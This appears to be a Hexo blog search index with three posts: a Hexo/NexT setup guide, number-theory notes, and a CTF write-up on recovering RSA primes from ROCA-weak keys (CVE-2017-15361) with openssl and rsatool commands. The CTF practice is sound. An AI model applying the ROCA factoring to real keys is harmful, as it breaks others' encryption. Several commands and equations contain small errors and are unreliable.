<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>22-10-21-Hexo-Build-Beautify</title>
    <url>/2022/10/21/22-10-21-hexo-build-beautify/</url>
    <content><![CDATA[<p>The article is used to record how to use hexo to build my own blog. I will try my best to make records by using English. To Be Honest, this is really somewhat a hard challenge for me.</p>
<p>The problems and some solutions are as follows.</p>
<span id="more"></span>
<blockquote>
<p><a href="https://hexo-next.readthedocs.io/">https://hexo-next.readthedocs.io/</a></p>
</blockquote>
<h1>BUILD HEXO</h1>
<blockquote>
<p>preparation:</p>
<p>git</p>
<p>node.js</p>
</blockquote>
<p>after the installation, test:</p>
<p><code>node -v</code>/<code>npm -v</code>/ <code>git -v</code></p>
<h2 id="HEXO-BLOG">HEXO BLOG</h2>
<blockquote>
<p>all use git-bash</p>
</blockquote>
<ul>
<li>to install hexo:</li>
</ul>
<p><code>npm install -g hexo-cli</code></p>
<ul>
<li>init hexo and build blog:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init [blogname]</span><br><span class="line">cd [blogname]</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
<ul>
<li>after building the common commands:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate/hexo g</span><br><span class="line">hexo server/hexo s</span><br><span class="line">hexo deploy/hexo d(unless everything is OK)</span><br><span class="line"># hexo clean &amp;&amp; hexo g &amp; hexo s</span><br></pre></td></tr></table></figure>
<h2 id="NEW-POST">NEW POST</h2>
<ul>
<li>set markdown</li>
</ul>
<p>In <code>scaffolds\post.md</code>, above the <code>!--more--</code> can make the article excerption</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">categories: </span><br><span class="line">tags: </span><br><span class="line">mathjax: true</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line"># to limit the length of article</span><br></pre></td></tr></table></figure>
<ul>
<li>new post</li>
</ul>
<p><code>hexo new [postname]</code></p>
<p>To make the article and everting clean, follow the standard <code>YY-MM-DD-article-name.md</code></p>
<p>And the categories are as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">categories:</span><br><span class="line">	- Studying</span><br><span class="line">	- Reading</span><br><span class="line">	- Recording</span><br><span class="line">	- Amusing</span><br></pre></td></tr></table></figure>
<h1>DRAFT/BAND GITHUB</h1>
<ul>
<li>register the github account</li>
<li>new repository</li>
</ul>
<p>Create a new repository, github has reserved your own website.</p>
<p><code>[githubaccount].github.io</code></p>
<ul>
<li>use token to authenticate</li>
</ul>
<p>In the root menu, add the follows to the file <strong>_config.yml</strong>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># install:</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line"></span><br><span class="line"># _config.yml</span><br><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: https://[token]@github.com/[githubaccount]/[githubaccount].github.io</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
<ul>
<li>git config</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># if authentication failed</span><br><span class="line">git config --globaluser.name &quot;yourname&quot;</span><br><span class="line">git config --global user.email &quot;youremail&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>after everything above is ready</li>
</ul>
<p><code>hexo d</code>, test if the running is well.</p>
<p>the default website is: <code>localhost:4000/</code></p>
<h1>MATH</h1>
<p>If the markdown can not display well,  maybe the renderer gets wrong.</p>
<p>The hexo default renderer is <code>hexo-renderer-marked</code>.</p>
<p>You can use <code>hexo-renderer-kramed</code> or <code>@upupming/renderer-markdown-it-plus</code> to replace the default one.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm i @upupming/hexo-renderer-markdown-it-plus --save</span><br></pre></td></tr></table></figure>
<p><strong>DON’T FORGET!</strong></p>
<p>In <code>_config.next.yml</code> set:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">math:</span><br><span class="line">  # Default (false) will load mathjax / katex script on demand.</span><br><span class="line">  # That is it only render those page which has `mathjax: true` in front-matter.</span><br><span class="line">  # If you set it to true, it will load mathjax / katex script EVERY PAGE.</span><br><span class="line">  every_page: true</span><br><span class="line"></span><br><span class="line">  mathjax:</span><br><span class="line">    enable: true</span><br><span class="line">    # Available values: none | ams | all</span><br><span class="line">    tags: none</span><br><span class="line"></span><br><span class="line">  katex:</span><br><span class="line">    enable: false</span><br><span class="line">    # See: https://github.com/KaTeX/KaTeX/tree/master/contrib/copy-tex</span><br><span class="line">    copy_tex: false</span><br></pre></td></tr></table></figure>
<p>and in your every post fonts, add <code>math: true</code></p>
<h1>NOT 404</h1>
<h2 id="question">question</h2>
<p>When I visit the tags, the website always return <code>404</code>. I search for some solutions all over the web. However, most of them are wrong, until I see the solution in the Zhihu.</p>
<h2 id="solution">solution</h2>
<h3 id="new-page">new page</h3>
<p>In the root of the blog, open the git bash command.</p>
<p><code>hexo new page &quot;tags&quot;</code></p>
<h3 id="edit-the-index">edit the index</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: tags</span><br><span class="line">type: tags</span><br><span class="line">layout: tags # /theme/next/layout/[tags].njk</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p><em>Behind the layout, to write down <strong>the name of the target njk</strong>, which is in the depth of the file path.</em></p>
<h3 id="edit-the-config-file">edit the _config file</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Dirctory</span><br><span class="line">tag_dir: tags</span><br></pre></td></tr></table></figure>
<p>Make the names one-to-one.</p>
<h1>CALCULATE WORDS</h1>
<h2 id="hexo-word-counter">hexo-word-counter</h2>
<p>Install the plugin <code>hexo-word-counter</code>, in the root path of blog.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-word-counter</span><br><span class="line">hexo clean &amp;&amp; hexo g</span><br></pre></td></tr></table></figure>
<h2 id="config">config</h2>
<p>In <code>_config.yml</code>, at the end of the file add the follows:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">symbols_count_time:</span><br><span class="line">  symbols: true</span><br><span class="line">  time: true</span><br><span class="line">  total_symbols: true</span><br><span class="line">  total_time: true</span><br><span class="line">  exclude_codeblock: false</span><br><span class="line">  awl: 4</span><br><span class="line">  wpm: 275</span><br><span class="line">  suffix: &quot;mins.&quot;</span><br></pre></td></tr></table></figure>
<p><em>In <code>_config.next.yml</code>, edit the finding <code>item_text_total: false</code>. Change <code>false</code> to <code>true</code>.</em></p>
<h1>BACKGROUND PICTURE</h1>
<p>I tried more ways to set background picture, more thins were wrong. Util I saw an article, I done this thing.</p>
<p>When I reflected all my things on this part, I knew the keypoint part was to **add the correct source path **to <code>next_config</code>.</p>
<h2 id="js-file">js file</h2>
<p>The NexT v8 has the <code>canvas-nest.js</code> in <code>themes\next\source\js</code>.</p>
<p>If you don’t have the <strong>JS</strong> file, create the new file contains：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">!<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">function</span> <span class="title function_">n</span>(<span class="params">n,e,t</span>)&#123;<span class="keyword">return</span> n.<span class="title function_">getAttribute</span>(e)||t&#125;<span class="keyword">function</span> <span class="title function_">e</span>(<span class="params">n</span>)&#123;<span class="keyword">return</span> <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(n)&#125;<span class="keyword">function</span> <span class="title function_">t</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> t=<span class="title function_">e</span>(<span class="string">&quot;script&quot;</span>),o=t.<span class="property">length</span>,i=t[o-<span class="number">1</span>];<span class="keyword">return</span>&#123;<span class="attr">l</span>:o,<span class="attr">z</span>:<span class="title function_">n</span>(i,<span class="string">&quot;zIndex&quot;</span>,-<span class="number">1</span>),<span class="attr">o</span>:<span class="title function_">n</span>(i,<span class="string">&quot;opacity&quot;</span>,<span class="number">.5</span>),<span class="attr">c</span>:<span class="title function_">n</span>(i,<span class="string">&quot;color&quot;</span>,<span class="string">&quot;0,0,0&quot;</span>),<span class="attr">n</span>:<span class="title function_">n</span>(i,<span class="string">&quot;count&quot;</span>,<span class="number">99</span>)&#125;&#125;<span class="keyword">function</span> <span class="title function_">o</span>(<span class="params"></span>)&#123;c=u.<span class="property">width</span>=<span class="variable language_">window</span>.<span class="property">innerWidth</span>||<span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientWidth</span>||<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">clientWidth</span>,a=u.<span class="property">height</span>=<span class="variable language_">window</span>.<span class="property">innerHeight</span>||<span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientHeight</span>||<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">clientHeight</span>&#125;<span class="keyword">function</span> <span class="title function_">i</span>(<span class="params"></span>)&#123;l.<span class="title function_">clearRect</span>(<span class="number">0</span>,<span class="number">0</span>,c,a);<span class="keyword">var</span> n,e,t,o,u,d,x=[w].<span class="title function_">concat</span>(y);y.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">i</span>)&#123;<span class="keyword">for</span>(i.<span class="property">x</span>+=i.<span class="property">xa</span>,i.<span class="property">y</span>+=i.<span class="property">ya</span>,i.<span class="property">xa</span>*=i.<span class="property">x</span>&gt;c||i.<span class="property">x</span>&lt;<span class="number">0</span>?-<span class="number">1</span>:<span class="number">1</span>,i.<span class="property">ya</span>*=i.<span class="property">y</span>&gt;a||i.<span class="property">y</span>&lt;<span class="number">0</span>?-<span class="number">1</span>:<span class="number">1</span>,l.<span class="title function_">fillRect</span>(i.<span class="property">x</span>-<span class="number">.5</span>,i.<span class="property">y</span>-<span class="number">.5</span>,<span class="number">1</span>,<span class="number">1</span>),e=<span class="number">0</span>;e&lt;x.<span class="property">length</span>;e++)n=x[e],i!==n&amp;&amp;<span class="literal">null</span>!==n.<span class="property">x</span>&amp;&amp;<span class="literal">null</span>!==n.<span class="property">y</span>&amp;&amp;(o=i.<span class="property">x</span>-n.<span class="property">x</span>,u=i.<span class="property">y</span>-n.<span class="property">y</span>,d=o*o+u*u,d&lt;n.<span class="property">max</span>&amp;&amp;(n===w&amp;&amp;d&gt;=n.<span class="property">max</span>/<span class="number">2</span>&amp;&amp;(i.<span class="property">x</span>-=<span class="number">.03</span>*o,i.<span class="property">y</span>-=<span class="number">.03</span>*u),t=(n.<span class="property">max</span>-d)/n.<span class="property">max</span>,l.<span class="title function_">beginPath</span>(),l.<span class="property">lineWidth</span>=t/<span class="number">2</span>,l.<span class="property">strokeStyle</span>=<span class="string">&quot;rgba(&quot;</span>+m.<span class="property">c</span>+<span class="string">&quot;,&quot;</span>+(t+<span class="number">.2</span>)+<span class="string">&quot;)&quot;</span>,l.<span class="title function_">moveTo</span>(i.<span class="property">x</span>,i.<span class="property">y</span>),l.<span class="title function_">lineTo</span>(n.<span class="property">x</span>,n.<span class="property">y</span>),l.<span class="title function_">stroke</span>()));x.<span class="title function_">splice</span>(x.<span class="title function_">indexOf</span>(i),<span class="number">1</span>)&#125;),<span class="title function_">r</span>(i)&#125;<span class="keyword">var</span> c,a,u=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;canvas&quot;</span>),m=<span class="title function_">t</span>(),d=<span class="string">&quot;c_n&quot;</span>+m.<span class="property">l</span>,l=u.<span class="title function_">getContext</span>(<span class="string">&quot;2d&quot;</span>),r=<span class="variable language_">window</span>.<span class="property">requestAnimationFrame</span>||<span class="variable language_">window</span>.<span class="property">webkitRequestAnimationFrame</span>||<span class="variable language_">window</span>.<span class="property">mozRequestAnimationFrame</span>||<span class="variable language_">window</span>.<span class="property">oRequestAnimationFrame</span>||<span class="variable language_">window</span>.<span class="property">msRequestAnimationFrame</span>||<span class="keyword">function</span>(<span class="params">n</span>)&#123;<span class="variable language_">window</span>.<span class="built_in">setTimeout</span>(n,<span class="number">1e3</span>/<span class="number">45</span>)&#125;,x=<span class="title class_">Math</span>.<span class="property">random</span>,w=&#123;<span class="attr">x</span>:<span class="literal">null</span>,<span class="attr">y</span>:<span class="literal">null</span>,<span class="attr">max</span>:<span class="number">2e4</span>&#125;;u.<span class="property">id</span>=d,u.<span class="property">style</span>.<span class="property">cssText</span>=<span class="string">&quot;position:fixed;top:0;left:0;z-index:&quot;</span>+m.<span class="property">z</span>+<span class="string">&quot;;opacity:&quot;</span>+m.<span class="property">o</span>,<span class="title function_">e</span>(<span class="string">&quot;body&quot;</span>)[<span class="number">0</span>].<span class="title function_">appendChild</span>(u),<span class="title function_">o</span>(),<span class="variable language_">window</span>.<span class="property">onresize</span>=o,<span class="variable language_">window</span>.<span class="property">onmousemove</span>=<span class="keyword">function</span>(<span class="params">n</span>)&#123;n=n||<span class="variable language_">window</span>.<span class="property">event</span>,w.<span class="property">x</span>=n.<span class="property">clientX</span>,w.<span class="property">y</span>=n.<span class="property">clientY</span>&#125;,<span class="variable language_">window</span>.<span class="property">onmouseout</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;w.<span class="property">x</span>=<span class="literal">null</span>,w.<span class="property">y</span>=<span class="literal">null</span>&#125;;<span class="keyword">for</span>(<span class="keyword">var</span> y=[],s=<span class="number">0</span>;m.<span class="property">n</span>&gt;s;s++)&#123;<span class="keyword">var</span> f=<span class="title function_">x</span>()*c,h=<span class="title function_">x</span>()*a,g=<span class="number">2</span>*<span class="title function_">x</span>()-<span class="number">1</span>,p=<span class="number">2</span>*<span class="title function_">x</span>()-<span class="number">1</span>;y.<span class="title function_">push</span>(&#123;<span class="attr">x</span>:f,<span class="attr">y</span>:h,<span class="attr">xa</span>:g,<span class="attr">ya</span>:p,<span class="attr">max</span>:<span class="number">6e3</span>&#125;)&#125;<span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="title function_">i</span>()&#125;,<span class="number">100</span>)&#125;();</span><br></pre></td></tr></table></figure>
<h2 id="add-path">add path</h2>
<p>My NexT layout file is in the path <code>themes\next\layout\_layout.njk</code>.</p>
<p>For we created the js file, we saved as <code>canvas-nest.js</code>. Open the <code>_layout.njk</code>, and add the following words. <em>REMEMBER above the <code>&lt;/body&gt;</code></em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Background picture --&gt;</span><br><span class="line">  &lt;script type=&quot;text/javascript&quot; src=&quot;/js/canvas-nest.js&quot;&gt;	   &lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h1>ICON</h1>
<blockquote>
<p><a href="https://fontawesome.com/search">https://fontawesome.com/search</a></p>
</blockquote>
<h1>ATTACH FILES</h1>
<p>We may hope visitors that can download files easily and conveniently. Thus, we can upload our relating files onto the same name file. Eg. The post is named <code>22-10-21-hexo-build-beautify.md</code>, and its same name file is <code>22-10-21-hexo-build-beautify</code>. They are created at the same time.</p>
<p>After uploading, and you can quote the file path in the post. And we can download these things while visiting.</p>
<ul>
<li>Picture <code>![filename](filepath)</code></li>
<li>Zip <code>[filename](filepath)</code></li>
<li>……</li>
</ul>
<p><em>At the same path!</em></p>
<h1>FOLK  ME</h1>
<p>The function is in<code>layout.njk</code>.</p>
<p>in <code>headband</code> module add the following code:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;your url&quot;</span> <span class="attr">class</span>=<span class="string">&quot;github-corner&quot;</span> <span class="attr">aria-label</span>=<span class="string">&quot;View source on GitHub&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;80&quot;</span> <span class="attr">height</span>=<span class="string">&quot;80&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 250 250&quot;</span> <span class="attr">style</span>=<span class="string">&quot;fill:#fff; color:#151513; position: absolute; top: 0; border: 0; left: 0; transform: scale(-1, 1);&quot;</span> <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">&quot;M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">&quot;M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;currentColor&quot;</span> <span class="attr">style</span>=<span class="string">&quot;transform-origin: 130px 106px;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;octo-arm&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">&quot;M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;currentColor&quot;</span> <span class="attr">class</span>=<span class="string">&quot;octo-body&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-class">.github-corner</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.octo-arm</span>&#123;<span class="attribute">animation</span>:octocat-wave <span class="number">560ms</span> ease-in-out&#125;<span class="keyword">@keyframes</span> octocat-wave&#123;<span class="number">0%</span>,<span class="number">100%</span>&#123;<span class="attribute">transform</span>:<span class="built_in">rotate</span>(<span class="number">0</span>)&#125;<span class="number">20%</span>,<span class="number">60%</span>&#123;<span class="attribute">transform</span>:<span class="built_in">rotate</span>(-<span class="number">25deg</span>)&#125;<span class="number">40%</span>,<span class="number">80%</span>&#123;<span class="attribute">transform</span>:<span class="built_in">rotate</span>(<span class="number">10deg</span>)&#125;&#125;<span class="keyword">@media</span> (<span class="attribute">max-width</span>:<span class="number">500px</span>)&#123;<span class="selector-class">.github-corner</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.octo-arm</span>&#123;<span class="attribute">animation</span>:none&#125;<span class="selector-class">.github-corner</span> <span class="selector-class">.octo-arm</span>&#123;<span class="attribute">animation</span>:octocat-wave <span class="number">560ms</span> ease-in-out&#125;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ensure that the <code>pjax</code> in <code>_config.next.yml</code> is <code>true</code></p>
<h1>TITLE CASE</h1>
<p>to make the titles follow the standard of title, we can turn the <code>titlecase</code> into <code>true</code></p>
<img src="/2022/10/21/22-10-21-hexo-build-beautify/1.png" class="" title="image-20230224144610422">
<h1>DAY/NIGHT MODE</h1>
<blockquote>
<p><a href="https://www.techgrow.cn/posts/abf4aee1.html">Hexo Next 8.x 主题添加可切换的暗黑模式 | Clay 的技术博客 (techgrow.cn)</a></p>
</blockquote>
<p><strong>TBC</strong></p>
]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>self_promtion</tag>
      </tags>
  </entry>
  <entry>
    <title>22-11-15-Math</title>
    <url>/2022/11/15/22-11-15-math/</url>
    <content><![CDATA[<p>Some import theorems which are suitable for applying to Cryptography.</p>
<p>At the same time, the post which is made as the record to note me that how to improve or deduction.</p>
<span id="more"></span><!--toc-->
<h1>Fermat’s little theorem</h1>
<p>Let $p$ be a prime number,  and $a$ be any integer. Then $a^{p} - a$ is always divisible by $p$.</p>
<p>And we can write as:<br>
$$<br>
a^{p} \equiv a \mod p<br>
$$<br>
Make a deduction, we can get that:<br>
$$<br>
a^{p-1} \equiv 1 \mod p<br>
$$</p>
<h1>Euler’s criterion</h1>
<p>If the modulo $p$ is a odd prime and is prime to $a$, we can get $a^{p-1}\equiv 1 \mod p$ by using the fermat’s little theorem.</p>
<p>We define that $p = 2q + 1$， and we will get $a^{2q} \equiv 1 \mod p$:<br>
$$<br>
\Longrightarrow (a^{2q} - 1) \times (2^{2q} + 1) \equiv 0 \mod p<br>
$$<br>
So the $a^q \equiv \pm 1 \mod p$，means that $a^{\frac{p-1}{2}} \equiv \pm 1 \mod p$.</p>
<p>In fact, we have the equation which is called euler’s criterion.<br>
$$<br>
(\frac{a}{p}) \equiv a^{\frac{p - 1}{2}} \mod p<br>
$$</p>
<h2 id="proof">proof</h2>
<p>“$a$ is the quadratic remainder of modulo $p$” is a sufficient condition for “$a^{\frac{p-1}{2}} \equiv 1 \mod p$”.</p>
<ul>
<li>Sufficiency:</li>
<li>Necessity:</li>
</ul>
]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>fermat_little_theorem</tag>
      </tags>
  </entry>
  <entry>
    <title>22-11-01-Qq</title>
    <url>/2022/11/01/22-11-01-qq/</url>
    <content><![CDATA[<p>The problem is mainly based on the <strong>backdoor</strong>. In RSA library, it has the CVE of <code>CVE-2017-15361</code>.In this case, we can calculate the prime which is likely random with the equation that:<br>
$$<br>
Prime = k \times M + (65537^{a} \mod M)<br>
$$<br>
It means that produce the list of primes and make them to collide， which satisfy the condition, thus output the target prime.</p>
<p>Also，the PKI system has different standards， we make some distinctions between different standards.</p>
<span id="more"></span>
<h1>RSA Backdoor</h1>
<blockquote>
<p>reference: <a href="https://asecuritysite.com/encryption/copper">https://asecuritysite.com/encryption/copper</a></p>
</blockquote>
<h2 id="description">description</h2>
<p>In RSALib, the prime is produced by the equaction:<br>
$$<br>
Prime = k \times M + 65537^{a} \mod M<br>
$$<br>
which means that the $M$ is the multiplication of the generated primes.<br>
$$<br>
M = \prod_{i=1}^{n}{P_{i}}= P_{1} \times P_{2} \times \cdots \times P_{n}<br>
$$<br>
$M$ must be large and is around the same size of they generated. The weakness is the $k$ and $a$ are relatively small values. The entropy is also must drop.</p>
<p>The problem is common provided with $c$, $e$ and $n$, and just do the command<code>RSA_Backdoor(n)</code>. If the problems satisfy the conditions, the  function will return the $p$ and the $q$.</p>
<h1>Openssl</h1>
<blockquote>
<p>relate to the PKI system.</p>
</blockquote>
<h2 id="generate">generate</h2>
<p>In kali, you can directly input the command that <code>openssl</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out [pri].pem 1024</span><br><span class="line">openssl rsa -in [pri].pem -pubout -out [pub].pem</span><br><span class="line"></span><br><span class="line">## if needs to encrypto, like AES or anything else</span><br><span class="line">openssl genrsa [-aes256 -passout pass:111111] -out [pri].key 2048</span><br><span class="line">openssl rsa -in [pri].key -pubout -out [pri].key</span><br><span class="line">Enter pass phrase for [pri].key:</span><br><span class="line"># openssl rsa -in [pri].key -passin pass:111111 -pubout -out [pub].key</span><br><span class="line">writing RSA key</span><br></pre></td></tr></table></figure>
<p>If in python, we can import something to ensure the same consequence.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="comment"># RSA.generate(bits, randfunc = None, e = 65537)</span></span><br><span class="line"><span class="comment"># - bits: bit_length</span></span><br><span class="line"><span class="comment"># - randfunc: Crypto.Random.get_random_bytes()</span></span><br><span class="line"><span class="comment"># - e(int): odd, common is 65537</span></span><br><span class="line">rsa = rsa.generate(<span class="number">1024</span>)</span><br><span class="line"><span class="comment"># export prikey</span></span><br><span class="line">pri = rsa.exportKey()</span><br><span class="line"><span class="comment"># export pubkey</span></span><br><span class="line">pub = rsa.publickey().exportKey()</span><br><span class="line"><span class="comment"># or write in the file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pri.pem&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">    f1.write(pri)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pub.pem&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">    f2.write(pub)</span><br></pre></td></tr></table></figure>
<h2 id="reverse">reverse</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># PKCS1 -&gt; PKCS8 privatekey</span><br><span class="line">openssl pkcs8 -topk8 -inform PEM -in rsa_pri.pem -outform PEM -nocrypt -out rsa_pri_pkcs8.pem</span><br><span class="line"></span><br><span class="line"># PKCS8 -&gt; PKCS1 privatekey</span><br><span class="line">openssl rsa -inform PEM -in rsa_pri_pkcs8.pem -outform PEM -out rsa_pri_pkcs1.pem</span><br><span class="line"></span><br><span class="line"># PKCS8 -&gt; PKCS1 publickey</span><br><span class="line">openssl rsa -pubin -in rsa_pub.pem -RSAPublicKey_out -out rsa_pub_pkcs1.pem</span><br><span class="line"></span><br><span class="line"># PKCS1 -&gt; PKCS8 publickey</span><br><span class="line">openssl rsa -RSAPublicKey_in -in rsa_pub_pkcs1.pem -pubout -out rsa_pub_pkcs8.pem</span><br></pre></td></tr></table></figure>
<h1>Key_Differences</h1>
<h2 id="PKCS-8">PKCS#8</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># pubkey</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line"></span><br><span class="line"># prikey</span><br><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">-----END PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line"># prikey encrypted</span><br><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<h2 id="PKCS-1">PKCS#1</h2>
<blockquote>
<p>import rsa</p>
<p>the default is PKCS#1</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># pubkey</span><br><span class="line">-----BEGIN RSA PUBLIC KEY-----</span><br><span class="line">-----END RSA PUBLIC KEY-----</span><br><span class="line"></span><br><span class="line"># prikey</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<h1>Rsatool</h1>
<blockquote>
<p><a href="https://github.com/ius/rsatool">GitHub - ius/rsatool: rsatool can be used to calculate RSA and RSA-CRT parameters</a></p>
</blockquote>
<h2 id="requirements">requirements</h2>
<ul>
<li>python3.7+</li>
<li>pyasn1</li>
<li>gmpy2</li>
</ul>
<h2 id="usage">usage</h2>
<h3 id="pem">pem</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 rsatool.py -f PEM -o key.pem -n [n] -d [d]</span><br><span class="line">python3 rsatool.py -f PEM -o private.pem -p [p] -q [q] -e [e]</span><br></pre></td></tr></table></figure>
<h3 id="der">der</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 rsatool.py -f DER -o key.der -p [p] -q [q]</span><br></pre></td></tr></table></figure>
<h1>Pem in RSA</h1>
<p>The pem can be used in different ways in RSA.</p>
<p>One is to extract the $n$ and the $e$—— when you get $p$, $q$ from the $n$, we can change <code>flag.enc</code> to $c$ by using the function <code>bytes_to_long()</code>.</p>
<p>The other way is also extract the $n$ and the $e$ ——however, we MUST construct the primes and others into the <code>pri.pem</code>. Using the <code>pri.pem</code>，and we can decrypt the <code>flag.enc</code> to get the message.</p>
<h2 id="1101-qq">[1101]qq</h2>
<blockquote>
<p>mainly using bytes_to_long()</p>
</blockquote>
<h3 id="flag-enc">flag.enc</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CwhE2kUKvphGegBRgnZeM8iE2oTPfmzMYfL4cO262NkQpId+JzH4pEyiS3cdyhDRsU+huX9cnIE=</span><br></pre></td></tr></table></figure>
<h3 id="pub-key-pem">pub_key.pem</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MFMwDQYJKoZIhvcNAQEBBQADQgAwPwI4EkoKC0EfUXgDvsQUYRI+j0/XPrqQxHJ+</span><br><span class="line">v3CKL9WVp5SMk0Njud03to6sxuvPt93fSGHkAsW+wHsCAwEAAQ==</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
<h3 id="exp-py"><a href="http://exp.py">exp.py</a></h3>
